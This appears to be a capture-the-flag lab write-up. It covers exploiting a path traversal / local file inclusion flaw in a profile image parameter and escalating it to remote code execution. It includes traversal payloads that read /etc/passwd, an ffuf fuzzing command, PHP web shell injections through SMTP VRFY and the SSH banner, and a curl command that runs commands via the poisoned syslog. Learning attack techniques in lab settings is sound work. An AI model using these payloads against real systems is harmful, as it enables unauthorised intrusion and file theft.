# LFI + path traversal

From inspection of the network requests, I found a request that loads the profile image using a query parameter to specify the path to the file:

```http
GET /profile.php?img=profile.png HTTP/1.1
Host: xxx.xxx.xxx.xxx:50000
User-Agent: xxx
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: connect.sid=xxxx
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

As found previously, the `profile.png` is present in the `/uploads` directory. Thus, it appears that the `img` query input will be used to search for a file in that directory.&#x20;

Possible path: `/var/www/html/uploads/profile.png`.

### Simple payloads

With knowledge of the current directory, I started off with simple payloads:

1. Path traversal
   * `../../../../etc/passwd`
   * `%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd`  (URL encoded)
   * `..//..//..//..//etc/passwd`
   * `%2E%2E%2F%2F%2E%2E%2F%2F%2E%2E%2F%2F%2E%2E%2F%2Fetc%2Fpasswd` (URL encoded)
2. Remote public resource
   * [https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTAx6camOf\_G96Zcs2Zj34Yjmy0ysPd-p0oJQ\&s](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTAx6camOf_G96Zcs2Zj34Yjmy0ysPd-p0oJQ\&s)



### Brute force discovery

I performed a brute force attack using `ffuf`, with the [wordlist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/JHADDIX_LFI.txt):

* Cookie: `-H "Cookie: PHPSESSID=xxxx"`&#x20;
* Filter out empty responses: `--fs 0`

{% code overflow="wrap" %}
```sh
$ ffuf -w /<wordlist> -u http://<target>:50000/profile.php?img=FUZZ -H "Cookie: PHPSESSID=xxxx" --fs 0
```
{% endcode %}

The payload: `....//....//....//....//....//....//....//....//....//etc/passwd` was found to work:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This provides us the following information:

1. Usernames:
   * `joshua`, `charles`
2. More importantly, the server is vulnerable to a Local File Inclusion (LFI) vulnerability!

### Exploring methods of exploitation

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md" %}

Following the guide in the link above, I explored a few methods to gain RCE on the system. From the previous enumeration steps, we have found multiple open ports/services, where some of them provides use a means to escalate the LFI to RCE.

#### Log poisoning

I tried accessing the following log files (appended to found payload above):

```
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/sshd.log
/var/log/mail
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
```

#### 1. SMTP (port 25)  \~ `/var/log/syslog`

From enumeration of the _**SMTP**_ commands, I found a few that will directly log user inputs into the log file:

```sh
1. RCPT TO:<input> # requires MAIL TO:<addr> before
2. VRFY <input>
```

With this in mind, we can exploit this to achieve RCE. Let's use the _**VRFY**_ command:

```sh
VRFY <?php system($_GET['cmd']); ?>
```

Now, reading the `/var/log/syslog` via the LFI vulnerability, we are able to view the output of our command that will be executed on the vulnerable machine. With that, we have a gained a web shell. The output can be viewed with the command:

{% code overflow="wrap" %}
```sh
$ curl 'http://xxx.xxx.xxx.xxx:50000/profile.php?img=....//....//....//....//....//....//....//....//....//var/log/syslog&cmd=<command>' -H "Cookie: PHPSESSID=xxxx" --silent | tail -n 20

```
{% endcode %}

The following command allows us to read the last 20 lines of the log file. Remember to replace `<command>` with the actual command, and set the **PHPSESSID**.

We can now replace the command to look around the directory and view the contents of the text file to retrieve our final flag!

#### 2. SSH (port 22) \~ `/var/log/auth.log`&#x20;

**Username**

I attempted to send a payload via the username field to SSH:

```sh
$ ssh '<?php system('id'); ?>'@<host>
```

However, the SSH client does not allow special characters in the username.

**Identification string**

I explored another method to poison the logs via the identification string:

```sh
$ nc <host> 22
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11
<?php system($_GET['cmd']); ?> # click enter right after
```

This method works.

#### Interesting discovery

With the `img` payload value of `#` (`/profile.php?img=#`), we are presented with a status **400** response:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Even though this does not allow for any direct exploits, it tells us the hostname: `mail.filepath.lab.`
